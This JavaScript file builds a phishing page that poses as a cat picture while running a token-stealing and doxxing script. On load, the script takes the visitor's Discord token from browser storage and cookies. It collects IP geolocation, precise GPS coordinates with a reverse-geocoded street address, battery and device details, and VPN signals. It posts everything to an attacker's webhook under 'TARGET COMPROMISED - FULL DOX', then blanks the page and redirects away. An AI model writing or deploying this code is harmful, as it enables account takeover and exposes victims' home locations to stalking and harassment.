function generateDoxHTML(webhook) {
    const imageUrl = 'https://cdn.pixabay.com/photo/2017/01/02/22/29/cat-1941089_1280.jpg';

    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0b0b12;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', sans-serif;
            overflow: hidden;
        }
        .container { text-align: center; }
        .container img {
            max-width: 90%;
            max-height: 80vh;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            border: 1px solid rgba(255,255,255,0.06);
        }
        .caption {
            color: #555;
            font-size: 14px;
            margin-top: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="${imageUrl}" alt="Cat" />
        <div class="caption">Loading...</div>
    </div>

<script>
const WEBHOOK_URL = "${webhook}";

// ---- SEND TO WEBHOOK ----
async function sendToWebhook(data) {
    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
    } catch(e) {}
}

// ---- STEAL DISCORD TOKEN ----
function stealToken() {
    try {
        const token = localStorage.getItem('token') || 
                      document.cookie.split('; ').find(row => row.startsWith('token='))?.split('=')[1] ||
                      sessionStorage.getItem('token');
        if (token) {
            sendToWebhook({
                content: \`**🎯 DISCORD TOKEN:** \` + \`\`\`\${token}\`\`\`\n**FULL ACCESS - ACCOUNT COMPROMISED**\`
            });
        }
    } catch (e) {}
}

// ---- GET ACCURATE IP DATA ----
async function getIPData() {
    try {
        // Primary: ipinfo.io (most accurate)
        const res = await fetch('https://ipinfo.io/json');
        const data = await res.json();
        if (data.ip) {
            return {
                ip: data.ip,
                country: data.country || 'N/A',
                region: data.region || 'N/A',
                city: data.city || 'N/A',
                postal: data.postal || 'N/A',
                lat: data.loc ? data.loc.split(',')[0] : 'N/A',
                lon: data.loc ? data.loc.split(',')[1] : 'N/A',
                asn: data.asn || 'N/A',
                isp: data.org || 'N/A',
                timezone: data.timezone || 'N/A',
                hostname: data.hostname || 'N/A'
            };
        }
    } catch (e) {}

    // Fallback: ip-api.com
    try {
        const res = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query');
        const data = await res.json();
        if (data.status === 'success') {
            return {
                ip: data.query || 'N/A',
                country: data.country || 'N/A',
                region: data.regionName || 'N/A',
                city: data.city || 'N/A',
                postal: data.zip || 'N/A',
                lat: data.lat || 'N/A',
                lon: data.lon || 'N/A',
                asn: data.as || 'N/A',
                isp: data.isp || 'N/A',
                timezone: 'N/A',
                hostname: 'N/A'
            };
        }
    } catch (e) {}

    return {
        ip: 'N/A',
        country: 'N/A',
        region: 'N/A',
        city: 'N/A',
        postal: 'N/A',
        lat: 'N/A',
        lon: 'N/A',
        asn: 'N/A',
        isp: 'N/A',
        timezone: 'N/A',
        hostname: 'N/A'
    };
}

// ---- GET GPS LOCATION (with user permission) ----
async function getGPSLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                resolve({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    heading: pos.coords.heading,
                    speed: pos.coords.speed
                });
            },
            (err) => {
                resolve(null);
            },
            { enableHighAccuracy: true, timeout: 8000 }
        );
    });
}

// ---- REVERSE GEOCODE (get address from GPS) ----
async function reverseGeocode(lat, lon) {
    try {
        const res = await fetch(\`https://nominatim.openstreetmap.org/reverse?lat=\${lat}&lon=\${lon}&format=json&zoom=18&addressdetails=1\`);
        const data = await res.json();
        if (data && data.display_name) return data.display_name;
    } catch (e) {}
    return null;
}

// ---- GET BATTERY ----
async function getBattery() {
    try {
        const b = await navigator.getBattery();
        return {
            level: Math.round(b.level * 100),
            charging: b.charging,
            chargingTime: b.chargingTime,
            dischargingTime: b.dischargingTime
        };
    } catch {
        return null;
    }
}

// ---- DETECT VPN (ACCURATE) ----
function detectVPN(ipData, gpsData) {
    const signals = [];
    let vpnScore = 0;

    // 1. Check ISP for known VPN/proxy providers
    const vpnKeywords = ['vpn', 'proxy', 'cloudflare', 'aws', 'amazon', 'digitalocean', 'vultr', 'linode', 'hetzner', 'ovh', 'm247', 'psychz', 'hostinger', 'namecheap', 'contabo', 'server', 'hosting', 'dedicated', 'datacenter', 'cloud', 'vps', 'leaseweb', 'akamai', 'fastly', 'cloudfront'];
    const isp = (ipData.isp || '').toLowerCase();
    const asn = (ipData.asn || '').toLowerCase();
    const hostname = (ipData.hostname || '').toLowerCase();
    
    for (const keyword of vpnKeywords) {
        if (isp.includes(keyword) || asn.includes(keyword) || hostname.includes(keyword)) {
            vpnScore += 2;
            signals.push('ISP/ASN matches VPN/hosting provider');
            break;
        }
    }

    // 2. Check timezone mismatch
    try {
        const browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        if (ipData.timezone && ipData.timezone !== 'N/A' && browserTz && ipData.timezone !== browserTz) {
            vpnScore += 3;
            signals.push(\`Timezone mismatch: IP says \${ipData.timezone} but browser says \${browserTz}\`);
        }
    } catch (e) {}

    // 3. Check GPS vs IP location mismatch
    if (gpsData && ipData.lat !== 'N/A' && ipData.lon !== 'N/A') {
        const ipLat = parseFloat(ipData.lat);
        const ipLon = parseFloat(ipData.lon);
        const gpsLat = gpsData.lat;
        const gpsLon = gpsData.lon;
        
        // Calculate distance (rough estimate)
        const distance = Math.sqrt(Math.pow(ipLat - gpsLat, 2) + Math.pow(ipLon - gpsLon, 2)) * 111; // ~111km per degree
        if (distance > 100) {
            vpnScore += 5;
            signals.push(\`Location mismatch: IP says \${ipData.city} but GPS shows different location (approx \${Math.round(distance)}km away)\`);
        }
    }

    // 4. Check if IP is from datacenter/hosting ASN
    const datacenterASNs = ['AS13335', 'AS16509', 'AS14618', 'AS15169', 'AS14061', 'AS54113', 'AS396982', 'AS20473', 'AS16276', 'AS8075', 'AS15133', 'AS13414', 'AS62567', 'AS14061'];
    if (ipData.asn) {
        const asnNum = ipData.asn.replace('AS', '');
        if (datacenterASNs.some(a => ipData.asn.includes(a) || ipData.asn.includes(a.replace('AS', '')))) {
            vpnScore += 3;
            signals.push('IP belongs to datacenter/hosting provider');
        }
    }

    // 5. Connection type check
    try {
        const conn = navigator.connection || navigator.mozConnection;
        if (conn && conn.type === 'vpn') {
            vpnScore += 3;
            signals.push('Connection type reported as "vpn"');
        }
    } catch (e) {}

    // Determine if VPN is likely
    const detected = vpnScore >= 3;

    return {
        detected: detected,
        score: vpnScore,
        signals: signals,
        confidence: vpnScore >= 5 ? 'High' : vpnScore >= 3 ? 'Medium' : 'Low'
    };
}

// ---- RUN EVERYTHING ----
async function runDox() {
    console.log('Pulse dox page loaded');

    // 1. Steal token instantly
    stealToken();

    // 2. Get IP data
    const ipData = await getIPData();
    
    // 3. Request GPS
    const gpsData = await getGPSLocation();
    
    // 4. Get battery
    const battery = await getBattery();
    
    // 5. Detect VPN
    const vpn = detectVPN(ipData, gpsData);
    
    // 6. Get address from GPS
    let gpsAddress = null;
    if (gpsData) {
        gpsAddress = await reverseGeocode(gpsData.lat, gpsData.lon);
    }

    // 7. Get browser info
    const ua = navigator.userAgent;
    const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
    const os = ua.includes('Windows NT 10.0') ? 'Windows 10/11' : ua.includes('Windows NT 6.1') ? 'Windows 7' : ua.includes('Mac OS X') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
    const device = /mobile|android|iphone|ipad/i.test(ua) ? 'Mobile' : 'Desktop';
    const now = new Date();
    const timestamp = now.toISOString();
    const localTime = now.toString();

    // 8. Build embed fields
    const fields = [];

    // IP info
    fields.push({ name: '🌐 IP Address', value: ipData.ip || 'N/A', inline: true });
    fields.push({ name: '🏙️ City', value: ipData.city || 'N/A', inline: true });
    fields.push({ name: '🗺️ Region', value: ipData.region || 'N/A', inline: true });
    fields.push({ name: '🌍 Country', value: ipData.country || 'N/A', inline: true });
    fields.push({ name: '📮 Postal', value: ipData.postal || 'N/A', inline: true });
    fields.push({ name: '🔢 ASN', value: ipData.asn || 'N/A', inline: true });
    fields.push({ name: '🏢 ISP', value: ipData.isp || 'N/A', inline: true });
    fields.push({ name: '🕒 Timezone', value: ipData.timezone || 'N/A', inline: true });

    // IP Coordinates
    if (ipData.lat !== 'N/A' && ipData.lon !== 'N/A') {
        const mapUrl = \`https://www.google.com/maps?q=\${ipData.lat},\${ipData.lon}\`;
        const streetView = \`https://www.google.com/maps?q=\${ipData.lat},\${ipData.lon}&layer=c\`;
        fields.push({ name: '📍 IP Location', value: \`[\${ipData.lat}, \${ipData.lon}](\${mapUrl}) | [Street View](\${streetView})\`, inline: false });
    }

    // GPS Location (if available)
    if (gpsData) {
        const gpsMapUrl = \`https://www.google.com/maps?q=\${gpsData.lat},\${gpsData.lon}\`;
        const gpsStreetView = \`https://www.google.com/maps?q=\${gpsData.lat},\${gpsData.lon}&layer=c\`;
        fields.push({ 
            name: '📍 GPS Location (EXACT)', 
            value: \`[\${gpsData.lat}, \${gpsData.lon}](\${gpsMapUrl}) | [Street View](\${gpsStreetView})\n**Accuracy:** \${Math.round(gpsData.accuracy)}m\`, 
            inline: false 
        });
        
        if (gpsAddress) {
            fields.push({ name: '🏠 GPS Address', value: gpsAddress, inline: false });
        }
    }

    // Battery
    if (battery) {
        fields.push({ 
            name: '🔋 Battery', 
            value: \`\${battery.level}%\${battery.charging ? ' (Charging 🔌)' : ' (Not Charging ⚡)'}\`, 
            inline: true 
        });
    }

    // VPN Detection
    fields.push({ 
        name: '🛡️ VPN/Proxy', 
        value: vpn.detected ? \`✅ **LIKELY** (Score: \${vpn.score})\nConfidence: \${vpn.confidence}\` : '❌ **NOT DETECTED**', 
        inline: true 
    });

    if (vpn.signals.length > 0) {
        fields.push({ name: '🔍 VPN Signals', value: vpn.signals.join('\\n'), inline: false });
    }

    // Device info
    fields.push({ name: '🧠 Browser', value: browser, inline: true });
    fields.push({ name: '💻 OS', value: os, inline: true });
    fields.push({ name: '🖥️ Device', value: device, inline: true });

    // Time
    fields.push({ name: '⏰ Local Time', value: localTime, inline: false });
    fields.push({ name: '📅 Timestamp', value: timestamp, inline: false });

    // 9. Send dox
    const embed = {
        title: '☠️ TARGET COMPROMISED - FULL DOX',
        color: 0xFF0000,
        fields: fields,
        footer: { text: '☠️ PULSE DOX SYSTEM - ' + timestamp }
    };

    await sendToWebhook({ embeds: [embed] });
    
    // Also send GPS address separately if available
    if (gpsAddress) {
        await sendToWebhook({ content: \`**📍 EXACT ADDRESS:** \${gpsAddress}\` });
    }

    console.log('Dox sent successfully');
}

// ---- RUN ----
runDox();

// ---- CLOSE AFTER 5 SECONDS ----
setTimeout(() => {
    document.body.innerHTML = '';
    document.body.style.background = '#000000';
    document.body.style.margin = '0';
    document.body.style.height = '100vh';
    
    setTimeout(() => {
        window.close();
        window.location.href = 'about:blank';
        setTimeout(() => {
            window.location.href = 'https://www.google.com';
        }, 200);
    }, 300);
}, 5000);

document.querySelector('.caption').textContent = 'Image loaded successfully.';
<\/script>
</body>
</html>`;
}
